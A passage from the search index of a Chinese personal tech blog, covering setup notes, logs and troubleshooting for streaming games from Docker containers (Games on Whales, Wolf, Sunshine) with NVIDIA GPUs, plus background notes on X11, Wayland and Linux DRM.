<pre><code>gow-sunshine-1  | [2023:05:16:03:40:37]: Error: Missing extension: [EGL_EXT_image_dma_buf_import]\ngow-sunshine-1  | [2023:05:16:03:40:37]: Info: Encoder [software] failed\ngow-sunshine-1  | [2023:05:16:03:40:37]: Fatal: Couldn't find any working encoder\ngow-sunshine-1 exited with code 2\n\n\n[2023:05:16:03:43:41]: Info: Screencasting with KMS\n[2023:05:16:03:43:41]: Error: Couldn't get primary file descriptor for Framebuffer [39]: Function not implemented\n[2023:05:16:03:43:41]: Info: Found monitor for DRM screencasting\n[2023:05:16:03:43:41]: Error: Failed to determine panel orientation, defaulting to landscape.\n[2023:05:16:03:43:41]: Error: Missing extension: [EGL_EXT_image_dma_buf_import]\n</code></pre></p> <p>\u91cd\u65b0\u6539\u4e3a\u7edd\u5bf9\u8def\u5f84\u540e\u6b63\u5e38\u3002screencasting\u786e\u5b9e\u4e0d\u4e00\u6837\u3002KMS-&gt;X11</p> <pre><code>[2023:05:16:03:51:33]: Error: Environment variable WAYLAND_DISPLAY has not been defined\n[2023:05:16:03:51:33]: Info: Detecting connected monitors\n[2023:05:16:03:51:33]: Info: // Testing for available encoders, this may generate errors. You can safely ignore those errors. //\n[2023:05:16:03:51:33]: Info: Trying encoder [nvenc]\n[2023:05:16:03:51:33]: Info: Screencasting with NvFBC\n[2023:05:16:03:51:35]: Error: Failed to create session:\n[2023:05:16:03:51:48]: Info: Encoder [nvenc] failed\n[2023:05:16:03:51:48]: Info: Trying encoder [vaapi]\n[2023:05:16:03:51:48]: Info: Screencasting with X11\n</code></pre>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#moonlight\u8fde\u63a5\u540e\u76f4\u63a5\u9000\u51fa","title":"moonlight\u8fde\u63a5\u540e\u76f4\u63a5\u9000\u51fa","text":"<p>\u53d1\u73b0TITAN V\u4e5f\u6709\u663e\u793a\u8f93\u51fa\uff0c\u5e76\u4e14\u6027\u80fd\u548cRTX 3070\u5dee\u4e0d\u591a\uff083070 104%, 3070Ti 110%\uff09\uff0c\u9042\u5c1d\u8bd5\u3002</p> <p>\u5bf9\u6bd4\u4e86log\uff0cxorg\u8fde\u63a5DP-0\u662f\u6ca1\u95ee\u9898\u7684\u3002sunshine\u4e2d\u4e5f\u6ca1\u6709\u660e\u663e\u4e0d\u540c\u7684log\u3002</p> <p>\u6700\u540e\u53d1\u73b0\u662f\u7cfb\u7edf\u5185\u6838\u7248\u672c\u4e3a4.15\uff0c\u7167\u7406\u6765\u8bf4ubuntu20.04\u9ed8\u8ba4\u662f5.4\u3002\u66f4\u65b0\u91cd\u542f\u540e\u6210\u529f\u3002</p> <p>\u8fdb\u5165\u540e\u53d1\u73b0vulkan\u753b\u9762\u6e32\u67d3\u6709\u95ee\u9898\uff08\u9ed1\u5c4f\uff09\uff0copengl\u6ca1\u95ee\u9898\u3002\u66f4\u65b0\u5230nvidia-drive-530\u540e\u89e3\u51b3\u3002</p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#docker\u65b9\u6848--wolf","title":"Docker\u65b9\u6848--Wolf","text":"<p>GoW \u7684\u66ff\u4ee3\u5347\u7ea7\u7248\u672c\uff0c\u4ec5\u4f7f\u7528\u5355\u4e2a\u955c\u50cf\u5305\u542b moonlight server\u3001PulseAudio\u3001wayland\u3001uinput\u7b49\u591a\u4e2a\u7ec4\u4ef6\u3002\u4e00\u6761\u547d\u4ee4 docker \u547d\u4ee4\u5c31\u53ef\u4ee5\u628a\u670d\u52a1\u8d77\u8d77\u6765\u3002</p> <p>\u603b\u7ed3</p> <ul> <li>\u4f18\u70b9<ul> <li>\u914d\u7f6e\u7b80\u5355\uff0c\u5355\u6761\u547d\u4ee4</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>4K \u4e32\u6d41\u4f1a\u5c06 5800x \u5355\u4e2a\u7ebf\u7a0b\u8dd1\u6ee1\uff0c\u5bfc\u81f4\u975e\u5e38 laggy\uff08\u786e\u5b9e\u662f\u4f7f\u7528 NVENC \u7f16\u7801 h265\uff09\uff0c\u4f7f\u7528 1080p \u5c31\u6b63\u5e38\u4e86\u3002</li> </ul> </li> </ul>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u8bbe\u7f6e","title":"\u8bbe\u7f6e","text":"<p>games-on-whales/wolf: Stream virtual desktops and games running in Docker (github.com)</p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u524d\u63d0","title":"\u524d\u63d0","text":"<p>1 \u5b89\u88c5\u914d\u7f6e <code>nvidia-container-toolkit</code> Installing the NVIDIA Container Toolkit \u2014 NVIDIA Container Toolkit 1.17.0 documentation <pre><code>sudo apt install nvidia-container-toolkit\nsudo nvidia-ctk runtime configure --runtime=docker\n\nsystemctl restart docker\n</code></pre></p> <p>2 \u542f\u7528 nvidia_drm <pre><code>sudo cat /sys/module/nvidia_drm/parameters/modeset\nY  # \u8f93\u51fa Y\n</code></pre></p> <ul> <li>nvidia-drm \u548c DRM \u6709\u5173\uff0cwolf \u57fa\u4e8e wayland \u9700\u8981\u4f7f\u7528 DRM</li> <li>\u6ca1\u6709\u5f00\u542f\u7684\u8bdd\u9700\u8981\u66f4\u6539\u6a21\u5757\u53c2\u6570\uff0c\u91cd\u65b0\u52a0\u8f7d\u3002\u7531\u4e8e nvidia \u6a21\u5757\u901a\u5e38\u88ab\u5360\u7528\uff0c\u56e0\u6b64\u4e00\u822c\u65e0\u6cd5\u76f4\u63a5\u91cd\u65b0\u52a0\u8f7d \u6a21\u5757\uff0c\u9700\u8981\u4fee\u6539\u53c2\u6570\uff0c\u7136\u540e\u91cd\u542f\u3002 <pre><code>sudo vim /etc/modprobe.d/nvidia-drm.conf\noptions nvidia-drm modeset=1\nsudo update-initramfs -u\n</code></pre></li> </ul>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#docker-\u53c2\u6570","title":"docker \u53c2\u6570","text":"<pre><code>docker run \\\n    --name wolf \\\n    --network=host \\\n    -e XDG_RUNTIME_DIR=/tmp/sockets \\\n    -v /tmp/sockets:/tmp/sockets:rw \\\n    -e HOST_APPS_STATE_FOLDER=/extra/wolf \\\n    -v /extra/wolf:/extra/wolf:rw \\\n    -v /extra/wolf/cfg:/etc/wolf/cfg:rw \\\n    -v /var/run/docker.sock:/var/run/docker.sock:rw \\\n    -e NVIDIA_DRIVER_CAPABILITIES=all \\\n    -e NVIDIA_VISIBLE_DEVICES=all \\\n    --gpus=all \\\n    --device /dev/dri/ \\\n    --device /dev/uinput \\\n    --device /dev/uhid \\\n    -v /dev/:/dev/:rw \\\n    -v /run/udev:/run/udev:rw \\\n    --device-cgroup-rule \"c 13:* rmw\" \\\n    ghcr.io/games-on-whales/wolf:stable\n</code></pre> <ul> <li><code>HOST_APPS_STATE_FOLDER</code>: defaults to\u00a0<code>/etc/wolf</code>, \u5b58\u50a8\u6240\u6709 app \u7684\u6570\u636e</li> <li><code>app_state_folder</code>: defaults to a unique identifier for each client so that every Moonlight session will have its own folder. Can be changed in the\u00a0<code>config.toml</code>\u00a0file.      - \u9ed8\u8ba4\u662f\u6bcf\u4e2a\u5ba2\u6237\u7aef\u91c7\u7528\u72ec\u7acb\u7684\u76ee\u5f55\uff0c\u56e0\u6b64\u6570\u636e\u4e0d\u5171\u4eab     - \u53ef\u4ee5\u5728 app toml \u4e2d\u5355\u72ec\u914d\u7f6e\uff0c\u5b9e\u73b0\u5ba2\u6237\u7aef\u5171\u4eab</li> <li><code>app_title</code>: the title of the app as defined in the\u00a0<code>config.toml</code>\u00a0file. \u548c\u5e94\u7528\u7a0b\u5e8f\u5b58\u50a8\u6570\u636e\u8def\u5f84\u6709\u5173\uff0c\u53ef\u4ee5\u5728 toml \u4e2d\u5355\u72ec\u914d\u7f6e</li> </ul> <p>\u539f\u7406\uff1a\u6253\u5f00\u6bcf\u4e2a\u5e94\u7528\u65f6\uff0cwolf \u5bb9\u5668 \u52a8\u6001\u521b\u5efa\u4e00\u4e2a \u5e94\u7528 app \u5bb9\u5668\uff0c\u5e76\u6dfb\u52a0\u6620\u5c04 <pre><code>HOST_APPS_STATE_FOLDER/app_state_folder/app_title:/home/wolf\n</code></pre></p> <p>\u56e0\u6b64\u4fee\u6539 HOST_APPS_STATE_FOLDER \u65f6\uff0c\u9700\u8981\u989d\u5916\u589e\u52a0\u4e00\u4e2a\u6620\u5c04\u5c06 host \u4e2d\u7684 HOST_APPS_STATE_FOLDER \u6620\u5c04\u5230\u5bb9\u5668\u5185\u7684 HOST_APPS_STATE_FOLDER\u3002\u5426\u5219\u521b\u5efa\u7684 app \u627e\u4e0d\u5230 HOST_APPS_STATE_FOLDER \u6307\u5411\u7684 host \u76ee\u5f55\u3002</p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u9047\u5230\u7684\u95ee\u9898_2","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u9ed1\u5c4f","title":"\u9ed1\u5c4f","text":"<p>\u5b98\u65b9\u6587\u6863\u8bf4\u521a\u5f00\u65f6\u9ed1\u5c4f\u662f\u56e0\u4e3a\u5728\u4e0b\u8f7d\u955c\u50cf\u548c update\u3002\u6211\u5728\u5b9e\u9a8c\u5ba4\u670d\u52a1\u5668\u4e0a\u59cb\u7ec8\u662f\u9ed1\u5c4f\uff0cryzen \u4e0a\u6d4b\u8bd5\uff0c\u7b2c\u4e00\u6b21\u9ed1\u5c4f\uff0c\u5173\u95ed\u5e94\u7528\uff0c\u7136\u540e\u8fde\u63a5\u5c31\u6b63\u5e38\u4e86\u3002</p> <p>\u53e6\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\u5374\u80fd\u591f\u6b63\u5e38\u8fd0\u884c</p> <p>\u53d1\u73b0\u95ee\u9898\u5728\u4e8e nvidia-drm \u6ca1\u6709\u542f\u7528\uff0c\u542f\u7528\u540e\u5c31\u597d\u4e86 <pre><code>sudo vim /etc/modprobe.d/nvidia-drm.conf\noptions nvidia-drm modeset=1\nsudo update-initramfs -u\n</code></pre></p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#steam-\u5927\u5c4f\u5e55\u542f\u52a8\u5361\u5728\u7f51\u7edc\u8bbe\u7f6e","title":"steam \u5927\u5c4f\u5e55\u542f\u52a8\u5361\u5728\u7f51\u7edc\u8bbe\u7f6e","text":"<p>\u63d0\u793a \u7535\u91cf\u4f4e\uff0c\u65e0\u6cd5\u8fdb\u884c\u4e0b\u4e00\u6b65\u64cd\u4f5c</p> <p>\u65e0\u6cd5\u542f\u52a8 Steam - \u7f51\u7edc\u95ee\u9898 \u00b7\u95ee\u9898 #120 \u00b7\u9cb8\u9c7c/\u72fc\u7684\u6e38\u620f --- Unable to start Steam - network issues \u00b7 Issue #120 \u00b7 games-on-whales/wolf (github.com)</p> <p>\u89e3\u51b3\u529e\u6cd5</p> <ul> <li>\u5173\u95ed\u5927\u5c4f\u5e55\u6a21\u5f0f\uff0c\u5728 config \u4e2d\u6dfb\u52a0\u989d\u5916\u7684\u73af\u5883\u53d8\u91cf <code>STEAM_STARTUP_FLAGS=-steamos3</code></li> <li>\u6211\u81ea\u5df1\u53d1\u73b0\u8fde\u70b9\u4e24\u4e0b\u6709\u7ebf\u8fde\u63a5\uff0c\u5c31\u80fd\u8df3\u8fc7\u8fd9\u91cc\u7684\u8bbe\u7f6e\uff0c\u76f4\u63a5\u8fdb\u5165 steam \u4e86</li> </ul>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u4e0d\u540cmoonlight-session-\u5171\u4eab\u5e94\u7528\u6570\u636e","title":"\u4e0d\u540cmoonlight session \u5171\u4eab\u5e94\u7528\u6570\u636e","text":"<p>\u5982\u4e0b\u6240\u793a\uff0c\u624b\u52a8\u4fee\u6539<code>/opt/opt/wolf/cfg/config.toml</code>\uff0c\u5c06\u914d\u5bf9\u7684 client \u7684 <code>app_state_folder</code> \u8bbe\u7f6e\u6210\u4e00\u6837\u7684\uff08\u8fd9\u91cc\u6211\u5df2\u7ecf\u5c06\u539f\u672c\u7684 client \u76ee\u5f55\u91cd\u547d\u540d\u4e3a <code>common</code>\uff09</p> <pre><code>paired_clients = [\n{run_gid = 1000, run_uid = 1000, app_state_folder = \"common\", client_cert =\"...\"},\n]\n</code></pre> <p>wolf HOST_APPS_STATE_FOLDER \u5178\u578b\u7ed3\u6784 <pre><code>/opt/opt/wolf\n\u251c\u2500\u2500 16963924829778730322\n\u2502   \u251c\u2500\u2500 RetroArch\n\u2502   \u2514\u2500\u2500 Steam\n\u251c\u2500\u2500 4674202571325744356\n\u2502   \u251c\u2500\u2500 Firefox\n\u2502   \u251c\u2500\u2500 RetroArch\n\u2502   \u251c\u2500\u2500 Steam\n\u2502   \u2514\u2500\u2500 Test ball\n\u251c\u2500\u2500 9429283158619851144\n\u2502   \u2514\u2500\u2500 RetroArch\n\u2502       \u2514\u2500\u2500 udev\n\u2502           \u251c\u2500\u2500 control\n\u2502           \u2514\u2500\u2500 data\n\u2502               \u2514\u2500\u2500 c13:76\n\u251c\u2500\u2500 cfg\n\u2502   \u251c\u2500\u2500 backtrace.2024-10-11-08-54-29.207356030.dump\n\u2502   \u251c\u2500\u2500 backtrace.2025-04-20-05-00-26.273162500.dump\n\u2502   \u251c\u2500\u2500 cert.pem\n\u2502   \u251c\u2500\u2500 config.toml\n\u2502   \u2514\u2500\u2500 key.pem\n\u251c\u2500\u2500 common\n\u2502   \u251c\u2500\u2500 Firefox\n\u2502   \u251c\u2500\u2500 RetroArch\n\u2502   \u2502   \u2514\u2500\u2500 retroarch.cfg\n\u2502   \u2514\u2500\u2500 Steam\n\u2502       \u251c\u2500\u2500 Desktop\n\u2502       \u2502   \u251c\u2500\u2500 Finding Paradise.desktop\n\u2502       \u2502   \u251c\u2500\u2500 Proton Experimental.desktop\n\u2502       \u2502   \u2514\u2500\u2500 Steam Linux Runtime 3.0 (sniper).desktop\n\u2502       \u2514\u2500\u2500 steam-2273430.log\n\u2514\u2500\u2500 fake-udev\n</code></pre></p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u4e3a-steam-\u6dfb\u52a0\u5355\u72ec\u6620\u5c04\u7684\u6e38\u620f\u8def\u5f84","title":"\u4e3a steam \u6dfb\u52a0\u5355\u72ec\u6620\u5c04\u7684\u6e38\u620f\u8def\u5f84","text":"","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#windows-compositor","title":"windows compositor","text":"<p>\u6210\u529f\u4e32\u6d41 firefox \u540e\uff0c\u6ce8\u610f\u5230\u9664\u4e86\u6d4f\u89c8\u5668\uff0c\u5c31\u53ea\u80fd\u770b\u5230\u9876\u4e0a\u7cfb\u7edf\u7684\u4efb\u52a1\u6761\u3002\u6709\u6309\u94ae\u53ef\u4ee5\u6253\u5f00\u7ec8\u7aef\uff0c\u7ec8\u7aef\u4ee5\u5206\u5c4f\u5f62\u5f0f\u5c55\u793a\u3002\u4f46\u662f\u7a97\u53e3\u90fd\u6ca1\u6709\u5173\u95ed\u6309\u94ae\u3002\u611f\u89c9\u53ef\u80fd\u662f\u7c7b\u4f3c iw3 \u90a3\u79cd\u7a97\u53e3\u7ba1\u7406\u5668\uff1f</p> <p>Wolf support both\u00a0Sway\u00a0and\u00a0Gamescope\u00a0compositor. Sway is used by default, but some game may work better with one or the other. Usage is controlled by environment variables on\u00a0<code>[apps.runner]</code>\u00a0configs:</p> <ul> <li><code>RUN_SWAY=1</code>\u00a0- enable Sway (Default for newer Wolf installation)</li> <li><code>RUN_GAMESCOPE=1</code>\u00a0- enable Gamescope</li> </ul>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u5b9e\u73b0\u7ec6\u8282\u975e\u5e38\u597d\u7684\u79d1\u666e","title":"\u5b9e\u73b0\u7ec6\u8282\uff08\u975e\u5e38\u597d\u7684\u79d1\u666e\uff09","text":"<p>Headless Wayland :: Games On Whales (games-on-whales.github.io)</p> <p>\u5df2\u7ecf\u77e5\u9053\u4e86\u4f7f\u7528 Gstreamer \u5c06\u56fe\u50cf\u4e32\u6d41\u5230 Moonlight\uff0c\u95ee\u9898\u662f\u5982\u4f55\u4ece upstream \u83b7\u5f97\u56fe\u50cf\u3002</p> <p>\u4f7f\u7528 X11 \u53ef\u4ee5\u5bb9\u6613\u505a\u5230\uff0c\u4f46\u662f\u6709\u5f88\u591a\u7f3a\u70b9</p> <ul> <li> <ul> <li>Xorg has to be up and running; we can run it via Docker in GOW but that\u2019s not without its challenges.</li> </ul> </li> <li>You need a physical monitor or a dummy plugged into your GPU (or some esoteric\u00a0EDID trick\u00a0which works only when also performing a human sacrifice).</li> <li>It doesn\u2019t scale well with multiple remote clients when sharing a single host</li> </ul> <p>\u6709\u6ca1\u6709\u4e00\u4e2a\u529e\u6cd5\u53ef\u4ee5\u76f4\u63a5\u4ece\u5e94\u7528\u8bfb\u53d6\u56fe\u50cf\uff1f </p> <p>\u603b\u7ed3</p> <p>\u901a\u8fc7\u81ea\u5b9a\u4e49\u4e2a\u4e00\u4e2a Wayland Compositor \u5b9e\u73b0\u4e86\u8be5\u529f\u80fd\u3002\u5f97\u76ca\u4e8e linux DRM\uff0ccompositor \u548c app \u95f4\u53ef\u4ee5\u901a\u8fc7 EGL \u5171\u4eab GPU memory\uff0c\u907f\u514d\u9700\u8981\u5728 CPU \u548c GPU \u95f4\u590d\u5236 2 \u6b21\u3002\u76ee\u524d\u5b58\u5728\u7684\u95ee\u9898\u662f\u4ece compositor \u5230 Gstreamer \u9700\u8981\u4e00\u6b21\u590d\u5236\uff0c\u4f7f\u7528 DMA buffer \u4e5f\u8bb8\u53ef\u4ee5\u89e3\u51b3\u8be5\u95ee\u9898\uff0c\u4f46\u662f\u76ee\u524d\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0c\u548c modifier \u6709\u5173\u3002</p> <p>What are modifiers? Modifiers add additional vendor specific properties to the internal pixel layout of a buffer. These modifiers are usually internally used by the GPU to speed up certain operations depending on characteristics of the hardware.</p> <p></p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u5176\u5b83\u65b9\u6848","title":"\u5176\u5b83\u65b9\u6848","text":"<p>docker steam\uff1amikenye/docker-steam: Valve's Steam, on Linux, in Docker. Perfect for gaming via Remote Play. (github.com)</p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u4f7f\u7528\u591agpu\u63d0\u5347\u6027\u80fd","title":"\u4f7f\u7528\u591aGPU\u63d0\u5347\u6027\u80fd\uff1f","text":"","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#sli","title":"SLI","text":"<p>Best Games With SLI Support 2023 [Complete List] - GPU Mag SLI_Best_Practices_2011_Feb.pdf (nvidia.com)</p> <p>\u8001 Chapter\u00a028.\u00a0Configuring SLI and Multi-GPU FrameRendering (nvidia.com) \u65b0 Chapter\u00a031.\u00a0Configuring SLI and Multi-GPU Mosaic (nvidia.com) Chapter\u00a06.\u00a0Configuring X for the NVIDIA Driver</p> <p>\u79d1\u666e \u3010\u5b98\u65b9\u53cc\u8bed\u3011\u591a\u663e\u5361\u7684\u5386\u53f2 #\u7535\u5b50\u901f\u8c08_\u54d4\u54e9\u54d4\u54e9_bilibili \u3010\u5b98\u65b9\u53cc\u8bed\u3011\u8dd1\u5f97\u6bd4SLI\u8fd8\u5feb\uff1fNVLink#linus\u8c08\u79d1\u6280_\u54d4\u54e9\u54d4\u54e9_bilibili \u3010\u5b98\u65b9\u53cc\u8bed\u3011SLI\u771f\u7684\u5df2\u6b7b#linus\u8c08\u79d1\u6280_\u54d4\u54e9\u54d4\u54e9_bilibili</p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#x11","title":"X11","text":"<p>Windowing system - Wikipedia Direct Rendering Manager - Wikipedia</p> <p>display server - \u4efb\u4f55\u9700\u8981\u663e\u793aGUI\u7684\u5e94\u7528\u90fd\u662fclient - server\u548cclient\u95f4\u901a\u8fc7\u534f\u8bae\u901a\u4fe1\u3002 - \u4ece\u5185\u6838\u83b7\u5f97input\uff08\u952e\u76d8\u3001\u9f20\u6807\u3001\u89e6\u63a7\u677f\uff09\uff0c\u5e76\u5c06\u5176\u53d1\u9001\u7ed9\u4e0d\u540c\u7684client - \u58f0\u97f3\u901a\u5e38\u4e0d\u8d1f\u8d23</p> <p>X11 - \u9700\u8981\u7b2c\u4e8c\u4e2a\u7a0b\u5e8f(composting window manager)\uff0c\u8d1f\u8d23\u7a97\u53e3\u7684\u7ec4\u5408(composting)\u3002 - \u5e38\u89c1\u5b9e\u73b0\uff1ax.org, xfree86 </p> <p>wayland\u4e0d\u540c - \u5305\u542b\u4e86compositing - client\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95eeframebuffer\u3002Wayland compositors communicate with Wayland clients over the\u00a0Wayland display server protocol. This protocol defines that clients can directly write data into the framebuffer using the\u00a0EGL rendering API. </p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#drm","title":"DRM","text":"<p>linux\u5185\u6838\u6a21\u5757</p> <p>The\u00a0Linux kernel\u00a0already had an\u00a0API\u00a0called\u00a0fbdev, used to manage the\u00a0framebuffer\u00a0of a\u00a0graphics adapter,but it couldn't be used to handle the needs of modern 3D-accelerated\u00a0GPU-based video hardware. - \u9700\u8981\u961f\u5217 These devices usually require setting and managing a command queue in\u00a0their own memory\u00a0to dispatch commands to the GPU and also require management of buffers and free space within that memory - \u907f\u514d\u4e86\u4e0d\u540c\u8bbe\u5907\u540c\u65f6\u8bbe\u7f6egpu\u5bfc\u81f4\u51b2\u7a81\u3002</p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u67b6\u6784api","title":"\u67b6\u6784/API","text":"<p>\u7528\u6237\u9700\u8981\u4f7f\u7528\u7684\u8bdd\uff0c\u9700\u8981\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u3002\u4f46\u662fDRM\u6ca1\u6709\u5b9a\u4e49\u65b0\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u800c\u662f\u9075\u4ece\u4e86unix\u4e07\u7269\u5373\u6587\u4ef6\u7684\u60f3\u6cd5\uff0c\u901a\u8fc7\u6587\u4ef6\u547d\u4ee4\u7a7a\u95f4\u5c06GPU\u66b4\u9732\u51fa\u6765\u3002\u4f4d\u4e8e/dev/\u5c42\u6b21\u4e0b\u7684device\u6587\u4ef6\uff08\u5728/dev/dri/cardX\uff09\u3002\u7528\u6237\u8fdb\u7a0b\u6253\u5f00dev\u6587\u4ef6\uff0c\u5e76\u901a\u8fc7ioctl\u8c03\u7528DRM\u3002</p> <p>\u7528\u6237\u7a7a\u95f4\u5e93libdrm\u5c06DRM ioctl API\u5305\u88c5\u4e3aC\u51fd\u6570\u3002</p> <p>DRM\u5305\u542b\u901a\u7528\u7684DRM core\u548c\u786c\u4ef6\u4e13\u7528\u7684DRM driver\u4e24\u90e8\u5206\u3002DRM core provides the basic framework where different DRM drivers can register and also provides to user space a minimal set of ioctls with common, hardware-independent functionality\u3002\u5f53DRM driver\u63d0\u4f9b\u4e86\u589e\u5f3a\u7684API\u65f6\uff0c\u7528\u6237\u7a7a\u95f4\u7684libdrm\u4e5f\u9700\u8981\u989d\u5916\u7684libdrm-driver\u8fdb\u884c\u6269\u5c55\u3002</p> <p></p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u4e24\u5927\u90e8\u5206","title":"\u4e24\u5927\u90e8\u5206","text":"<ul> <li>GEM\uff08Graphics Execution Manager\uff09\uff1a<ul> <li>\u7ba1\u7406\u663e\u5361memory\u3002Due to the increasing size of\u00a0video memory\u00a0and the growing complexity of graphics APIs such as\u00a0OpenGL, the strategy of reinitializing the graphics card state at each\u00a0context switch\u00a0was too expensive, performance-wise. Also, modern\u00a0Linux desktops\u00a0needed an optimal way to share off-screen buffers with the\u00a0compositing manager. These requirements led to the development of new methods to manage graphics\u00a0buffers\u00a0inside the kernel. T</li> </ul> </li> <li>KMS\uff08Kernel Mode Setting\uff09<ul> <li>\u7528\u4e8e\u8bbe\u7f6e\u663e\u5361\u8f93\u51fa\u5206\u8fa8\u7387\uff0cIn order to work properly, a video card or graphics adapter must set a\u00a0mode\u2014a combination of\u00a0screen resolution,\u00a0color depth\u00a0and\u00a0refresh 